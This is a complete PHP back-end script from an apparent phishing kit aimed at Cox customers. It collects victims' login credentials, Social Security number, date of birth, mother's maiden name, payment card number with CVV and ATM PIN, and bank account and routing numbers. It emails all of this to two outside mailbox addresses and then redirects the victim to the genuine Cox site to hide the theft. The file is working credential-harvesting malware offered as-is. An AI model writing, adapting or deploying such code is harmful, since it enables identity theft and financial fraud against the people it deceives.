<?

$ip = getenv("REMOTE_ADDR");
$message .= "---- : || GhostMode || :------\n";
$message .= "COX ID             : ".$_POST['username']."\n";
$message .= "Password              : ".$_POST['password']."\n";
$message .= "Phone Number              : ".$_POST['phone']."\n";
$message .= "S.S.N             : ".$_POST['ssn']."\n";
$message .= "D.O.B              : ".$_POST['dob']."\n";
$message .= "M.M.N            : ".$_POST['mmn']."\n";
$message .= "Name on Card              : ".$_POST['txtNameOnCC']."\n";
$message .= "Card Number             : ".$_POST['CCN']."\n";
$message .= "Exp Month            : ".$_POST['ccMonth']."\n";
$message .= "Exp Year             : ".$_POST['ccYear']."\n";
$message .= "C.V.V              : ".$_POST['cvv']."\n";
$message .= "A.T.M Pin             : ".$_POST['pin']."\n";
$message .= "Billing Address              : ".$_POST['baoc']."\n";
$message .= "Name on Account            : ".$_POST['txtNameOnBankAcct']."\n";
$message .= "Account Number              : ".$_POST['txtAcctNum']."\n";
$message .= "Routing Number             : ".$_POST['txtRoutingNum']."\n";
$message .= "Account Type            : ".$_POST['ddAcctType']."\n";
$message .= "----: || GhostMode || :------\n";
$message .= "IP: ".$ip."\n";


$recipient = "greggee2@yandex.com, jimmyDavis121@outlook.com";
$subject = " COX Billing LOGINS | ".$ip."\n";

mail($recipient,$subject,$message);
header("Location:  http://myconnection.cox.com/");
?>


